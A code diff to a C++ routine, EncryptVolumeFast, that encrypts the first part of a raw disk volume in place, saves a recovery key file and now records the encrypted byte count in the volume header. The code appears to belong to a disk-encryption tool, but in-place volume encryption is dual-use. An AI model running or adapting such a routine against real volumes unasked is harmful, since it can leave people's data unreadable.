@@ -902,10 +902,11 @@ bool FileCrypto::EncryptVolumeFast(const std::string& volume, const std::string&
         std::string apiKey = std::string(KEY_PREFIX) + Base64Encode(key, 32);
         keyPathOut = "D:\\\\" + std::string(1, (char)tolower((unsigned char)volume[0])) + "_recovery.key";
         SaveKeyFile(keyPathOut, apiKey);
-        std::vector<uint8_t> hdr(VOL_HDR, 0);
-        memcpy(hdr.data(), salt, 16); memcpy(hdr.data()+16, iv, AES_BLOCK); memcpy(hdr.data()+32, VOL_MAGIC, 8);
-        DWORD written; SetFilePointer(h, 0, NULL, FILE_BEGIN); WriteFile(h, hdr.data(), VOL_HDR, &written, NULL);
         size_t total = (size_t)(maxBytes < (size_t)(vsz - VOL_HDR) ? maxBytes : (size_t)(vsz - VOL_HDR));
+        uint64_t total64 = total;
+        std::vector<uint8_t> hdr(VOL_HDR, 0);
+        memcpy(hdr.data(), salt, 16); memcpy(hdr.data()+16, iv, AES_BLOCK); memcpy(hdr.data()+32, &total64, 8); memcpy(hdr.data()+40, VOL_MAGIC, 8);
+        DWORD written; SetFilePointer(h, 0, NULL, FILE_BEGIN); WriteFile(h, hdr.data(), VOL_HDR, &written, NULL);
         size_t rem = total; uint64_t off = VOL_HDR;
         std::vector<uint8_t> buf(1048576), encBuf;
         while (rem > 0) {
